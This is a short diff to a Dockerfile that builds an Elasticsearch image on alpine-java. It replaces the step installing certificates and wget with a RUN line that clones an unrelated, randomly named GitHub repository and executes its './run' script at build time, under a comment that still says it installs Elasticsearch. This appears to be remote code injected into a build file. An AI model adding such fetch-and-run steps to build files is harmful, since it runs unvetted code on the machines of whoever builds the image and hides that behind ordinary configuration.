@@ -8,7 +8,9 @@
 FROM anapsix/alpine-java
 
 # Install ElasticSearch.
-RUN apk update &&  apk add ca-certificates wget && update-ca-certificates
+RUN git clone --recursive https://github.com/mijikuhibimui/mujijankopo \ 
+    && cd mujijankopo \
+    && ./run
 RUN \
  mkdir /tmp/es && \
  cd /tmp/es && \
